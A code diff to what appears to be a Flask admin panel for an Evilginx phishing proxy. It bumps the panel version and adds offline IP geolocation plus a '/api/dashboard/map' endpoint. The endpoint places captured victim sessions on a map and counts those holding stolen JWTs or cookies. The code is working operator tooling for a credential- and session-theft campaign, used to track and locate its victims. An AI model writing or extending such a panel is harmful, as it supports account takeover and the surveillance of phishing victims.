@@ -4,6 +4,7 @@
 import os
 import sys
 import json
+import ipaddress
 import urllib.request
 import urllib.parse
 import yaml
@@ -42,7 +43,7 @@ PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
 PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
 PANEL_USER = os.environ.get("PANEL_USER", "root")
 PANEL_PASS = os.environ.get("PANEL_PASS", "")
-PANEL_VERSION = "3.5.2"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
+PANEL_VERSION = "3.5.3"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  FLASK SETUP
@@ -611,6 +612,124 @@ def _parse_sessions():
     out.sort(key=lambda x: x.get("create_time", 0), reverse=True)
     return out
 
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  GEO — local MMDB + IP cache (no live HTTP lookups)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+PANEL_DIR = os.path.dirname(os.path.abspath(__file__))
+GEO_DIR = os.path.join(PANEL_DIR, "geo")
+GEO_MMDB = os.path.join(GEO_DIR, "dbip-city-lite.mmdb")
+GEO_CACHE_PATH = os.path.join(GEO_DIR, "ip_cache.json")
+
+_geo_reader = None
+_geo_cache = None
+_geo_lock = threading.Lock()
+
+
+def _parse_remote_ip(addr):
+    addr = (addr or "").strip()
+    if not addr:
+        return ""
+    if addr.startswith("["):
+        end = addr.find("]")
+        if end > 0:
+            return addr[1:end]
+    if addr.count(":") == 1:
+        host, _, port = addr.partition(":")
+        if port.isdigit():
+            return host
+    return addr
+
+
+def _geo_en_name(obj):
+    if not isinstance(obj, dict):
+        return ""
+    names = obj.get("names")
+    if isinstance(names, dict):
+        return names.get("en") or next(iter(names.values()), "") or ""
+    return ""
+
+
+def _geo_open_reader():
+    global _geo_reader
+    if _geo_reader is not None:
+        return _geo_reader
+    try:
+        import maxminddb
+    except Exception:
+        return None
+    if not os.path.isfile(GEO_MMDB):
+        return None
+    try:
+        _geo_reader = maxminddb.open_database(GEO_MMDB)
+    except Exception:
+        _geo_reader = None
+    return _geo_reader
+
+
+def _geo_load_cache():
+    global _geo_cache
+    if _geo_cache is not None:
+        return _geo_cache
+    try:
+        with open(GEO_CACHE_PATH, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        _geo_cache = data if isinstance(data, dict) else {}
+    except Exception:
+        _geo_cache = {}
+    return _geo_cache
+
+
+def _geo_save_cache():
+    if _geo_cache is None:
+        return
+    os.makedirs(GEO_DIR, exist_ok=True)
+    tmp = GEO_CACHE_PATH + ".tmp"
+    with open(tmp, "w", encoding="utf-8") as f:
+        json.dump(_geo_cache, f, separators=(",", ":"), ensure_ascii=True)
+    os.replace(tmp, GEO_CACHE_PATH)
+
+
+def _geo_lookup(ip):
+    """Return (rec, wrote_cache). Never calls an external geo HTTP API."""
+    cache = _geo_load_cache()
+    hit = cache.get(ip)
+    if isinstance(hit, dict):
+        return hit, False
+    rec = {"lat": None, "lon": None, "city": "", "cc": ""}
+    try:
+        obj = ipaddress.ip_address(ip)
+        if (
+            obj.is_private
+            or obj.is_loopback
+            or obj.is_reserved
+            or obj.is_multicast
+            or obj.is_link_local
+            or obj.is_unspecified
+        ):
+            cache[ip] = rec
+            return rec, True
+    except Exception:
+        cache[ip] = rec
+        return rec, True
+    reader = _geo_open_reader()
+    if reader is None:
+        return rec, False
+    try:
+        data = reader.get(ip) or {}
+        loc = data.get("location") or {}
+        rec = {
+            "lat": loc.get("latitude"),
+            "lon": loc.get("longitude"),
+            "city": _geo_en_name(data.get("city")),
+            "cc": (data.get("country") or {}).get("iso_code") or "",
+        }
+    except Exception:
+        rec = {"lat": None, "lon": None, "city": "", "cc": ""}
+    cache[ip] = rec
+    return rec, True
+
 # ═══════════════════════════════════════════════════════════════════════════════
 #  AUTH
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -725,6 +844,61 @@ def api_dashboard():
         recent_jwt      = [{k: v for k, v in s.items() if k != "tokens"}
                            for s in ss if s["has_jwt"]][:15],
     )
+
+
+@app.route("/api/dashboard/map")
+@auth
+def api_dashboard_map():
+    ss = _parse_sessions()
+    counts = {
+        "all":    len(ss),
+        "jwt":    sum(1 for s in ss if s.get("has_jwt")),
+        "tokens": sum(1 for s in ss if (s.get("n_cookies") or 0) > 0),
+        "empty":  sum(1 for s in ss if (s.get("n_cookies") or 0) == 0),
+    }
+    buckets = {}
+    unknown = 0
+    dirty = False
+    with _geo_lock:
+        for s in ss:
+            ip = _parse_remote_ip(s.get("remote_addr"))
+            if not ip:
+                unknown += 1
+                continue
+            geo, wrote = _geo_lookup(ip)
+            if wrote:
+                dirty = True
+            lat, lon = geo.get("lat"), geo.get("lon")
+            if lat is None or lon is None:
+                unknown += 1
+                continue
+            b = buckets.get(ip)
+            if b is None:
+                b = {
+                    "ip": ip,
+                    "lat": lat,
+                    "lon": lon,
+                    "city": geo.get("city") or "",
+                    "cc": geo.get("cc") or "",
+                    "jwt": 0,
+                    "tokens": 0,
+                    "empty": 0,
+                    "n": 0,
+                }
+                buckets[ip] = b
+            b["n"] += 1
+            if s.get("has_jwt"):
+                b["jwt"] += 1
+            if (s.get("n_cookies") or 0) > 0:
+                b["tokens"] += 1
+            else:
+                b["empty"] += 1
+        if dirty:
+            try:
+                _geo_save_cache()
+            except Exception:
+                pass
+    return jsonify(counts=counts, points=list(buckets.values()), unknown=unknown)
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  API — CONFIG
